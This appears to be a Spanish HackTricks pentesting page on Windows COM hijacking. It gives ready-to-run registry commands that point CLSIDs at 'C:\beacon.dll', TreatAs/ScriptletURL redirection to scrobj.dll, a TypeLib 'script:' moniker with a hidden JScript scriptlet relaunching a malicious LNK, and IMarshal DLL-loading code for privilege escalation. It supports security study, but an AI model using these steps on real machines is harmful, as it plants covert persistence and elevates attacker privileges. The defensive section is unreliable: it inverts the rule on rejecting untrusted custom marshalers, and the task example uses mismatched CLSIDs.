# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Búsqueda de componentes COM inexistentes

Como los usuarios pueden modificar los valores de HKCU, **COM Hijacking** puede usarse como **mecanismo de persistencia**. Con `procmon` es fácil encontrar registros COM buscados que aún no existen y que un atacante podría crear. Filtros clásicos:

- Operaciones **RegOpenKey**.
- donde el _Result_ sea **NAME NOT FOUND**.
- y el _Path_ termine en **InprocServer32**.

Variaciones útiles durante la búsqueda:

- Busca también claves **`LocalServer32`** que no existan. Algunas clases COM son servidores fuera de proceso y ejecutarán un EXE controlado por el atacante en lugar de una DLL.
- Busca operaciones del registro **`TreatAs`** y **`ScriptletURL`**, además de `InprocServer32`. El contenido reciente sobre detección y los análisis de malware los destacan repetidamente porque son mucho menos comunes que los registros COM normales y, por tanto, ofrecen una señal de alta confianza.
- Al clonar un registro en HKCU, copia el **`ThreadingModel`** legítimo de `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Usar un modelo incorrecto suele impedir la activación y hacer que el hijacking genere ruido.<sup>[[3]](#references)</sup>
- En sistemas de 64 bits, inspecciona las vistas de 64 y 32 bits (`procmon.exe` frente a `procmon64.exe`, `HKLM\Software\Classes` y `HKLM\Software\Classes\WOW6432Node`), ya que las aplicaciones de 32 bits pueden resolver un registro COM diferente.

Una vez que hayas decidido qué COM inexistente suplantar, ejecuta los siguientes comandos. _Ten cuidado si decides suplantar un COM que se carga cada pocos segundos, ya que podría ser excesivo._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Componentes COM del Programador de tareas secuestrables

Las tareas de Windows usan desencadenadores personalizados para llamar a objetos COM y, como se ejecutan mediante el Programador de tareas, es más fácil predecir cuándo se activarán.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Al revisar la salida, puedes seleccionar uno que, por ejemplo, se ejecute **cada vez que un usuario inicia sesión**.

Ahora, al buscar el CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** en **HKEY\CLASSES\ROOT\CLSID**, así como en HKLM y HKCU, normalmente verás que el valor no existe en HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Entonces, solo tienes que crear la entrada HKCU y, cada vez que el usuario inicie sesión, se ejecutará tu backdoor.

## Registros COM colgantes y marshaling personalizado

Un registro COM de ámbito de equipo puede convertirse en una primitiva de DLL-planting sin modificar el registro. Busca un valor `InprocServer32` cuya DLL no exista y cuya ruta final pueda crear o modificar un usuario con pocos privilegios. Plantar una DLL con el nombre exacto hará que cualquier proceso que active el CLSID cargue código del atacante. En el ejemplo de CrossDevice, la ruta registrada era `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, por lo que un usuario estándar podía crear el directorio secundario y la DLL que faltaban.<sup>[[5]](#references)</sup>

### Mapas de plugins modificables como rutas de activación COM privilegiadas

Un mapa modificable de IDs de plugins a CLSID puede permitir que un usuario con menos privilegios elija qué servidor COM en proceso carga un servicio privilegiado, incluso si no se puede editar el registro de la clase en todo el equipo.<sup>[[8]](#references)[[9]](#references)</sup> En el caso reportado de `InstallService` en Windows 11, los usuarios estándar podían modificar `StaticPluginMap`; un ID de plugin que no fuera integrado seleccionaba un CLSID que el servicio `LocalSystem` pasaba a `CoCreateInstance` con `CLSCTX_INPROC_SERVER` e `IID_IInstallServicePlugin`.<sup>[[8]](#references)[[9]](#references)</sup> La DLL registrada se carga en el proceso del servicio, no en un host COM independiente.<sup>[[10]](#references)</sup>

Las condiciones relevantes son tener acceso de escritura efectivo al mapa, que se pueda alcanzar una solicitud de plugin y que el usuario con menos privilegios pueda controlar la ruta de la DLL `InprocServer32`.<sup>[[8]](#references)[[9]](#references)</sup> En el caso reportado, el registro de CrossDevice anterior proporcionaba la condición de la ruta.<sup>[[8]](#references)[[9]](#references)</sup> Un objeto de plugin válido debe exponer la interfaz solicitada, pero la DLL se carga antes de que `CoCreateInstance` termine; no exponer esa interfaz no descarta por sí solo la ejecución de código durante la carga.<sup>[[8]](#references)[[11]](#references)</sup> Esta ruta de despacho del servicio es distinta de la ruta de `IMarshal` personalizado que se describe a continuación. Para la primitiva independiente basada en la ruta de archivo, consulta [DLL Hijacking](dll-hijacking/).

### `IMarshal` como primitiva de carga de DLL entre procesos

COM normalmente representa un puntero de interfaz con un `OBJREF` estándar que remite al receptor al objeto original. En cambio, un objeto que implementa `IMarshal` puede generar un `OBJREF` personalizado. Su método `GetUnmarshalClass` proporciona el CLSID del código que reconstruirá el objeto en el proceso receptor. Ese CLSID no tiene que identificar al objeto original. COM lo resuelve como un servidor en proceso y carga la DLL registrada antes de despachar el método de interfaz solicitado.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Una implementación maliciosa mínima solo tiene que sustituir el CLSID colgante en `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Envía este objeto mediante un parámetro de método proxied, como `[in] IUnknown *`. Otra opción es `CoGetInstanceFromIStorage`, donde el objeto con marshaling personalizado también implemente suficiente de `IStorage` para superar las comprobaciones locales. El unmarshaling automático en el servidor remoto resuelve el CLSID sustituido, por lo que la DLL se carga antes de que se ejecute el método de destino.<sup>[[5]](#references)</sup>

La primitiva no se limita a registros ausentes. También puede forzar al receptor a cargar una DLL existente de custom-unmarshaler y exponer bugs en su ruta de carga o unmarshaling.<sup>[[5]](#references)</sup>

La cadena requiere todas las condiciones siguientes:<sup>[[5]](#references)</sup>

1. Un CLSID visible para la máquina apunta a una DLL in-process ausente o reemplazable.
2. El atacante puede colocar esa DLL en la ruta resuelta.
3. Un servidor COM out-of-process activable se ejecuta con el nivel de privilegios deseado.
4. El servidor acepta marshaling personalizado y expone una llamada proxied que transporta el objeto del atacante a través del límite entre procesos.

### Encontrar servidores in-process huérfanos

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) y [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) pueden enumerar la base de datos COM de la máquina y probar cada servidor mediante la resolución normal de módulos de Win32. Esto es preferible a `Test-Path`, porque algunos registros solo contienen un nombre de archivo y dependen de la ruta de búsqueda del loader.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Trata el resultado como una lista de candidatos, no como prueba de que sean explotables. Resuelve la ruta como lo hace el loader y luego inspecciona la DACL del primer directorio padre existente y de la DLL prevista, si ya existe. Un archivo inexistente solo es útil si el atacante puede crear o reemplazar la ruta que COM resolverá realmente.<sup>[[5]](#references)</sup>

### Seleccionar e iniciar un receptor privilegiado

Inspecciona las clases COM candidatas para comprobar `RunAs`, la asociación a servicios, las interfaces disponibles y los proxies RPC. Una clase configurada para `SYSTEM` pero que no esté respaldada por un servicio con nombre podría fallar al activarse directamente porque RPCSS no puede iniciarla. En ese caso, busca un activador sin privilegios que inicie su host, como una tarea programada ejecutable, y reproduce cualquier requisito previo de evento con nombre o IPC que mantenga el servidor en ejecución.<sup>[[5]](#references)</sup>

Por ejemplo, la cadena vulnerable de Shell Create Object Handler iniciaba su host creando el evento global esperado antes de invocar una tarea programada ejecutable por el usuario.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Vuelve a asociar la referencia del objeto resultante con su host y verifica tanto su identidad como la política de marshaling. Luego, enumera las interfaces y convierte sus proxies a IDL para encontrar un parámetro de entrada, como `IUnknown *`, que aplique marshaling al objeto falso.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Protecciones de custom marshaling

Un receptor adecuado no debe rechazar custom marshalers no confiables. Dos protecciones para todo el proceso son `EOAC_NO_CUSTOM_MARSHAL` en las capacidades que se pasan a `CoInitializeSecurity` y `COMGLB_UNMARSHALING_POLICY_STRONG`, que se establece mediante `IGlobalOptions::Set`. Con símbolos, se puede inspeccionar el estado correspondiente en `combase!gCapabilities` y `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager expone el resultado como `CustomMarshalAllowed` cuando su analizador de procesos admite la compilación de Windows.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` permite emular un CLSID con otro.<sup>[[4]](#references)</sup> Desde una perspectiva ofensiva, esto significa que puedes dejar intacto el CLSID original, crear un segundo CLSID por usuario que apunte a `scrobj.dll` y, luego, redirigir el objeto COM real al malicioso con `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Esto es útil cuando:

- la aplicación de destino ya instancia un CLSID estable al iniciar sesión o al arrancar la aplicación
- quieres una redirección solo mediante el registro, en lugar de reemplazar el `InprocServer32` original
- quieres ejecutar un scriptlet `.sct` local o remoto mediante el valor `ScriptletURL`

Flujo de trabajo de ejemplo (adaptado de técnicas públicas de Atomic Red Team y de investigaciones anteriores sobre el abuso del registro COM):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notes:

- `scrobj.dll` lee el valor `ScriptletURL` y ejecuta el `.sct` referenciado, por lo que puedes mantener el payload como un archivo local o descargarlo de forma remota mediante HTTP/HTTPS.
- `TreatAs` es especialmente útil cuando el registro COM original está completo y estable en HKLM, porque solo necesitas una pequeña redirección por usuario en lugar de replicar todo el árbol.
- Para validar sin esperar al desencadenador natural, puedes instanciar manualmente el ProgID/CLSID falso con `rundll32.exe -sta <ProgID-or-CLSID>` si la clase de destino admite activación STA.

## COM TypeLib Hijacking (script: moniker persistence)

Las bibliotecas de tipos (TypeLib) definen interfaces COM y se cargan mediante `LoadTypeLib()`. Cuando se instancia un servidor COM, el sistema operativo también puede cargar la TypeLib asociada consultando las claves del registro en `HKCR\TypeLib\{LIBID}`. Si la ruta de la TypeLib se reemplaza por un **moniker**, por ejemplo, `script:C:\...\evil.sct`, Windows ejecutará el scriptlet al resolver la TypeLib, lo que proporciona una persistence sigilosa que se activa cuando se accede a componentes comunes.

Esto se ha observado con el control Microsoft Web Browser (que suelen cargar Internet Explorer, las aplicaciones que incorporan WebBrowser e incluso `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Pasos (PowerShell)

1) Identifica la TypeLib (LIBID) que utiliza un CLSID de alta frecuencia. Ejemplo de CLSID que suelen aprovechar las cadenas de malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Configura la ruta TypeLib por usuario para que apunte a un scriptlet local usando el moniker `script:` (no se requieren privilegios de administrador):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Coloca un archivo `.sct` mínimo de JScript que vuelva a iniciar tu payload principal (p. ej., un `.lnk` usado en la cadena inicial):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Activación: abrir IE, una aplicación que integre el control WebBrowser o incluso la actividad rutinaria de Explorer cargará la TypeLib y ejecutará el scriptlet, rearmando tu cadena al iniciar sesión o reiniciar.

Limpieza
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notas
- Puedes aplicar la misma lógica a otros componentes COM de alta frecuencia; resuelve siempre primero el `LIBID` real desde `HKCR\CLSID\{CLSID}\TypeLib`.
- En sistemas de 64 bits también puedes rellenar la subclave `win64` para consumidores de 64 bits.

## References

- [1] [Secuestro de TypeLib: nueva técnica de persistencia COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research: campaña ZipLine: un sofisticado ataque de phishing dirigido a empresas estadounidenses](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Reexaminando el secuestro de COM (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Clave CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero: técnicas de explotación de Windows: registros de objetos COM colgantes](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn: interfaz IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications: MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [PoC de Dark Elevator y análisis técnico (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: escalada de privilegios locales mediante el servicio de instalación de Windows (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [Enumeración de CLSCTX (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [Función CoCreateInstance (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

